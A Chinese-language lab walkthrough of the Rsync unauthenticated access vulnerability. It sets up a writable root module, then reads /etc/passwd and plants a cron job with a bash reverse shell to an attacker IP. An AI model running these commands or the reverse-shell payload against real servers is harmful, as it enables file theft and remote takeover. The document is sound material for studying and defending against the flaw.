# Rsync未授权访问漏洞

## 漏洞描述

`Rsync`是`Linux`下一款数据备份工具，支持通过`rsync`协议、`ssh`协议进行远程文件传输。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。其中`rsync`协议默认监听`873`端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了`rsync`服务，并且没有配置`ACL`或访问密码，我们将可以读写目标服务器文件。

## 环境搭建

rsyncd.conf

```
uid = root
gid = root
use chroot = no
max connections = 4
syslog facility = local5
pid file = /var/run/rsyncd.pid
log file = /var/log/rsyncd.log

[src]
path = /
comment = src path
read only = no
```

启动rsync

```
rsync --no-detach --daemon --config /etc/rsyncd.conf
```



## 漏洞利用

环境启动后，我们用rsync命令访问之：

```
[root@localhost tmp]# rsync rsync://192.168.32.183:873/
src            	src path

```

查看`src`目录

```
[root@localhost tmp]# rsync rsync://192.168.32.183:873/
src            	src path
You have new mail in /var/spool/mail/root
[root@localhost tmp]# rsync rsync://192.168.32.183:873/src
drwxr-xr-x             28 2022/07/26 03:45:11 .
-rwxr-xr-x              0 2022/07/26 03:45:11 .dockerenv
-rwxr-xr-x            101 2022/05/19 09:45:03 docker-entrypoint.sh
drwxr-xr-x              6 2018/01/21 13:42:04 bin
drwxr-xr-x              6 2017/07/13 09:01:05 boot
drwxr-xr-x              6 2022/07/26 03:45:11 data
drwxr-xr-x            340 2022/07/26 03:45:11 dev
drwxr-xr-x             66 2022/07/26 03:45:11 etc
drwxr-xr-x              6 2017/07/13 09:01:05 home
drwxr-xr-x             21 2018/01/21 13:42:05 lib
drwxr-xr-x             34 2017/10/08 20:00:00 lib64
drwxr-xr-x              6 2017/10/08 20:00:00 media
drwxr-xr-x              6 2017/10/08 20:00:00 mnt
drwxr-xr-x              6 2017/10/08 20:00:00 opt
dr-xr-xr-x              0 2022/07/26 03:45:11 proc
drwx------             37 2017/10/08 20:00:00 root
drwxr-xr-x             80 2022/07/26 03:48:12 run
drwxr-xr-x          4,096 2017/10/08 20:00:00 sbin
drwxr-xr-x              6 2017/10/08 20:00:00 srv
dr-xr-xr-x              0 2022/07/25 22:41:55 sys
drwxrwxrwt              6 2022/07/26 03:44:41 tmp
drwxr-xr-x             42 2017/10/08 20:00:00 usr
drwxr-xr-x             17 2017/10/08 20:00:00 var

```

这是一个Linux根目录，我们可以下载任意文件：

```
[root@localhost tmp]# rsync -av rsync://192.168.32.183:873/src/etc/passwd ./
receiving incremental file list
passwd

sent 43 bytes  received 1,283 bytes  2,652.00 bytes/sec
total size is 1,197  speedup is 0.90

```

或者写入定时计划：

```
echo '* * * * * bash -i >& /dev/tcp/192.168.32.130/9999 0>&1' >> shell
```

```
[root@localhost tmp]# rsync -av shell  rsync://192.168.32.183:873/src/etc/cron.d/root
sending incremental file list
shell

sent 146 bytes  received 35 bytes  362.00 bytes/sec
total size is 55  speedup is 0.30
```

![image-20230129215525053](../../.gitbook/assets/image-20230129215525053.png)